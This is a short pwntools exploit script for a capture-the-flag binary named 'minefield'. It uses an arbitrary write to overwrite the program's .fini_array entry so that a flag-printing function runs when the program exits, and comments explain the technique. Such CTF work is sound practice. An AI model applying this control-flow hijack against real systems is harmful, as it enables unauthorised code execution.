from pwn import *

local_bin = "./minefield"
elf = ELF(local_bin)
rop = ROP(elf)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

#p = gdb.debug(local_bin, '''
	#break mission
	#break *mission+153
	#break *0x400bb1
	#break *r+44
	#continue
	#''')

p = process(local_bin)

'''
break *mission+153: 
I have an arbitrary write at any place

Insert type of mine: Specify arbitrary write location
Insert location to plant: Specify what i want to write

Concept:
Overwrite fini array 

Dumping sections
Cmd: objdump -p minefield 

FINI_ARRAY           0x0000000000601078

'''

OFFSET_PUTS_GOT = elf.got['puts']
print("PUTS_GOT = ", hex(OFFSET_PUTS_GOT))

OFFSET_STACK_GOT = elf.got['__stack_chk_fail']
print("OFFSET_STACK_GOT = ", hex(OFFSET_STACK_GOT))

OFFSET_CAT_FLAG = elf.symbols['_']
print("OFFSET_CAT_FLAG = ", hex(OFFSET_CAT_FLAG))


def arb_Write(location, value):
	p.sendline(b'2')
	p.recvuntil(b'mine:')
	p.send(location)
	p.recvuntil(b'plant:')
	p.send(value)


p.recvuntil(b'mine?')


#0x601500 = 6296832
#rsp = 140737488348264
#Overwrite fini array at 0x601078 = 6295672
#with cat_flag at 0x40096B
arb_Write(b'6295672', b'4196715')


p.interactive()